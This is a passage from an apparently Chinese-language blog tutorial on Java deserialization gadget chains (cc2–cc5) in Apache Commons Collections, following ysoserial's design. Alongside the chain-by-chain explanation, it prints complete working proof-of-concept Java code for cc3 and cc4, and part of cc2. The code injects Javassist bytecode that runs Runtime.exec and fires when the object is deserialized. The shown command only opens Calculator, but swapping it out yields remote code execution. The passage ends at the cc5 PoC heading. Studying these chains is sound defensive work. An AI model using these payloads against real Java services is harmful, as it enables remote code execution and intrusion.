_name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.开始做InvokerTransformer 命名为iInvokerTransformer，需要借助它内部的invoke方法调用newTransformer方法</span></span><br><span class="line">        <span class="comment">//然后用TransformingComparator包装他，因为TransformingComparator的构造函数可以把iInvokerTransformer传递给自身transformer属性</span></span><br><span class="line">        InvokerTransformer iInvokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator iTransformingComparator = <span class="keyword">new</span> TransformingComparator(iInvokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransformingComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc2_TemplatesImpl.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h2><p>条件：</p>
<ul>
<li><strong>commons-collections: 3.1～3.2.1</strong></li>
<li>jdk7u21之前</li>
</ul>
<p>cc3更像是cc1和cc2的缝合变体，借助了cc1的lazyMap+动态代理和cc2的newInstance。</p>
<h3 id="利用链寻找-3"><a href="#利用链寻找-3" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>如果我们先从后半段开始看，和cc2一样，我们的目标是执行TemplatesImpl的newTransformer方法来newInstance</p>
<p>cc2中我们知道，newTransformer方法属于TemplatesImpl类，更是Templates接口的方法，</p>
<p>我们需要寻找哪里调用了Templates.newTransformer方法</p>
<p>搜索一圈发现TrAXFilter这个类比较合适：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515111125775.png" alt="image-20210515111125775"></p>
<p>跟进去看，发现构造函数依赖Templates接口的参数，会调用参数的newTransformer方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515112530417.png" alt="image-20210515112530417"></p>
<p>所以现在，<strong>我们需要构造这个参数templates</strong></p>
<p>或者<strong>new 一个TrAXFilter类的实例</strong>也是可以的啊！ysoserial选择了后者</p>
<p>怎样可以new一个实例呢？</p>
<p>ysoserial找到了InstantiateTransformer，看看他的transform方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515104145715.png" alt="image-20210515104145715"></p>
<p>可以看到，这里面调用了input参数的调用方法，然后借助iParamTypes和iArgs实例化了一个对象出来。</p>
<p>我们还记得cc1中的Chain可以循环调用transform方法，我们让input是TrAXFilter类对象不就可以了么</p>
<p>所以这里还是得用到chain</p>
<p>有了chain，问题来到了哪里会调用chain的入口点呢也就是chain的第一个transform方法？</p>
<p>记得cc1的LazyMap么？他的get方法会调用transform，如果这里是chain不就美滋滋了么</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p>
<p>哪里可以调用lazyMap的get方法呢？</p>
<p>或许你还记得cc1的InvocationHandler的invoke会调用get方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145038750.png" alt="image-20210515145038750"></p>
<p>稳，现在就是怎么让memberValues参数是LazyMap类型呢？</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515145145356.png" alt="image-20210515145145356"></p>
<p>降维打击，<strong>动态代理</strong></p>
<p>我认为这里的思路一定是ysoserial的师傅们看到了AnnotationInvocationHandler既然是InvocationHandler的子类才想到。</p>
<p>假设现在有一个AnnotationInvocationHandler的类H</p>
<p>我们都知道，H要是想执行invoke方法，<strong>一定是H作为handler参与了一个动态代理类的实现</strong>。</p>
<p>我们假设上一句话提到的“一个动态代理类”是p，p调用了任何方法，都会交付给H的invoke去做。</p>
<p>同时我们还发现AnnotationInvocationHandler的readObject方法</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515151042914.png" alt="image-20210515151042914"></p>
<p>他可以对Map类型的属性memberValues执行entrySet方法</p>
<p>这里其实entrySet或者什么别的其实都不重要，重要的是<strong>发生了调用</strong></p>
<p>所以这里如果this,memberValues是一个LazyMap的代理类，那么这个代理类的handler的invoke方法就必将会执行。</p>
<p>所以我们上文提到的p，作为代理类，完全可以代理LazyMap类，handler配置为H就可以了</p>
<p>那么现在就是确定了我们的payload最外面是AnnotationInvocationHandler类，起名h2，我们要把h2.memberValues配置为一个动态代理，这里可以起名为mapProxy。</p>
<p>mapProxy目标是为了存放在h2.memberValues里，为了invoke。</p>
<p>mapProxy的handler位置需要设置为h1，这个h1也是AnnotationInvocationHandler类，h1.memberValues需要设置为LazyMap，为了LazyMap.get。</p>
<p>所以正常走下来就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">h2.readObject() -&gt; h2.memberValues.xxx() -&gt; mapproxy.xxx() -&gt; h1.invoke() -&gt; h1.memberValues.get() -&gt; LazyMap.get()</span><br></pre></td></tr></table></figure>



<p>成功续命。</p>
<h3 id="调用链流程梳理"><a href="#调用链流程梳理" class="headerlink" title="调用链流程梳理"></a>调用链流程梳理</h3><p>正常进入AnnotationInvocationHandler的readObject方法，h2的memberValues属性就是mapProxy</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133241920.png" alt="image-20210515133241920"></p>
<p>这里由于mapProxy是动态代理，所以只要调用就会调用handler的invoke方法，mapProxy的handler就是h1</p>
<p>h1也是AnnotationInvocationHandler类，所以会进入本类AnnotationInvocationHandler的invoke方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515133608739.png" alt="image-20210515133608739"></p>
<p>由于h1的memberValues属性是传进去的lazymap，所以会调用LazyMap的get方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134002101.png" alt="image-20210515134002101"></p>
<p>factory是chain，会进入chain的transform，接下里就很熟悉了：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515134046605.png" alt="image-20210515134046605"></p>
<p>成环调用，chain中第一个是元素是<code>new ConstantTransformer(TrAXFilter.class),</code>所以看上面，第一个循环的object返回的就是TrAXFilter的类对象（get(key)参数被无情抛弃），重点是第二次，会进入InstantiateTransformer的transform方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140301462.png" alt="image-20210515140301462"></p>
<p>这里面细说，input参数是第一次object对象也就是TrAXFilter.class类对象，iParamTypes属性就是外面构造好的Templates.class类对象，iArgs属性就是提前传进来的tmpl对象。</p>
<p>con方法是TrAXFilter类中，满足只有一个Templates接口参数的构造函数。</p>
<p>tmpl是TemplatesImpl类，会调用Templates接口的newInstance方法，参数是iArgs也就是tmpl。</p>
<p>所以这里会走到TrAXFilter类的构造函数：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210515140852568.png" alt="image-20210515140852568"></p>
<p>导致触发！</p>
<h3 id="最终版本PoC-4"><a href="#最终版本PoC-4" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p>PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain，封装进LazyMap</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 拿到cons,先做一个h1，h1.memberValues = lazymap</span></span><br><span class="line">        <span class="keyword">final</span> Constructor cons = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazymap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(),<span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例h2，并且把刚刚创建的代理赋值给h2.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc3_TrAXFilter.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h2><p>环境：</p>
<ul>
<li><strong>commons-collections4: 4.0</strong></li>
<li><strong>jdk7u21</strong>之前</li>
</ul>
<p>cc4是cc2和cc3的杂交体</p>
<p>前半段用了cc2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了，所以这里ysoserial用了cc3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。</p>
<h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>cc2里面的前半部分可以一直走到TransformingComparator的transform方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516161059025.png" alt="image-20210516161059025"></p>
<p>在cc2里面，这里面的<code>this.transformer</code>是InvokerTransformer，但是在cc4里，我们需要换成chain来包装InstantiateTransformer，也就离不开后续TrAXFilter的newInstance了。</p>
<h3 id="最终版本PoC-5"><a href="#最终版本PoC-5" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.构造chain,包装成TransformingComparator里，构造成</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">                        new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator iTransComparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> Object[]&#123;tmpl, <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">        _comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _comparator.set(pq, iTransComparator);</span><br><span class="line">        <span class="comment">//解封属性queue，queueArray =&gt; _queue</span></span><br><span class="line">        Field _queue = PriorityQueue.class.getDeclaredField("queue");</span><br><span class="line">        _queue.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _queue.set(pq, queueArray);</span><br><span class="line">        <span class="comment">//size修改为2</span></span><br><span class="line">        Field _size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        _size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _size.set(pq, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/src/main/resources/Payload_cc4_PriorityQueue.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里面在PriorityQueue处还可以有第二种写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始</span></span><br><span class="line">PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解封属性comparator, iTransformingComparator =&gt; _comparator</span></span><br><span class="line">Field _comparator = PriorityQueue.class.getDeclaredField("comparator");</span><br><span class="line">_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">_comparator.set(pq, iTransComparator);</span><br></pre></td></tr></table></figure>

<p>第二种为什么只提前add了两下就可以了呢？</p>
<p>debug一下，看第一次add：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171058621.png" alt="image-20210516171058621"></p>
<p>size默认是0，所以这里属性queue[]已经赋值了第一个元素Integer(1)，size也被复制为1</p>
<p>第二次add：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171416672.png" alt="image-20210516171416672"></p>
<p>进到siftUp看一下，我们没有给comparator赋值，所以会进入else分支：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171513699.png" alt="image-20210516171513699"></p>
<p>siftUpComparator会将元素重新排序：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171612711.png" alt="image-20210516171612711"></p>
<p>两次add结束之后的状态：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171655090.png" alt="image-20210516171655090"></p>
<p>接下来解封comparator属性，包我们构造好的TransformingComparator借助反射赋值给它:</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171754309.png" alt="image-20210516171754309"></p>
<p>最终属性：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516171933102.png" alt="image-20210516171933102"></p>
<p>话说回来，要是第一种，没有提前add两次赋值呢？</p>
<p>简短来说，那就是size和parator都没有赋值，只能再麻烦用反射去给size和queue赋值。</p>
<h2 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h2><p>条件：</p>
<ul>
<li><p><strong>commons-collections:3.1-3.2.1</strong></p>
</li>
<li><p><strong>jdk1.8</strong></p>
</li>
</ul>
<h3 id="利用链寻找-4"><a href="#利用链寻找-4" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来。</p>
<p>先看cc中的TiedMapEntry的源码：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200356238.png" alt="image-20210516200356238"></p>
<p>这里的map属性显然是可控的。</p>
<p>如果是我们熟悉的LazyMap就好了，这样就可以调用LazyMap.get方法进而触发Transformer的transform函数，执行调用链。</p>
<p>哪里可以调用TiedMapEntry的getValue呢？</p>
<p>TiedMapEntry的toString方法就可以</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516200813987.png" alt="image-20210516200813987"></p>
<p>那么有没有一个类可以在反序列化时触发 TiedMapEntry.toString() 呢？ BadAttributeValueExpException</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516201549257.png" alt="image-20210516201549257"></p>
<p>这里可以看到valObj也是从val属性拿到的，我们只要构造的时候把val属性设置为TiedMapEntry即可。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516202426352.png" alt="image-20210516202426352"></p>
<p>val是private，所以这里还是得用反射去构造。</p>
<h3 id="最终版本PoC-6"><a href="#最终版本PoC-6" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><p><strong>ver1</strong></p>
